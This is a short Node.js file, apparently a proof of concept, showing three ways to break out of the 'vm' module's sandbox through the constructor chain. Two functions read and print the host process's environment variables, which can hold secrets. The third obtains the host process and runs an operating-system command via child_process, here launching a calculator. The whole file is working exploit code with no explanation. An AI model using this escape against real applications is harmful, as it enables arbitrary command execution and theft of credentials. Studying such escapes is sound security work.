function sandBox1(){
    const vm = require('vm');
    const env = vm.runInNewContext(`this.constructor.constructor('return this.process.env')()`);
    console.log(env);
}

function sandBox2() {
    // the same as sandBox1()
    const vm = require('vm');
    const sandbox = {};
    const script = new vm.Script("this.constructor.constructor('return this.process.env')()");
    const context = vm.createContext(sandbox);
    const env = script.runInContext(context);
    console.log(env);
}

function sandBox3(){
    // replace env with EXP
    const vm = require('vm');
    const env = vm.runInNewContext(`
        const process = this.constructor.constructor('return this.process')();
        process.mainModule.require('child_process').execSync('/usr/bin/gnome-calculator');
    `);

}

sandBox3()
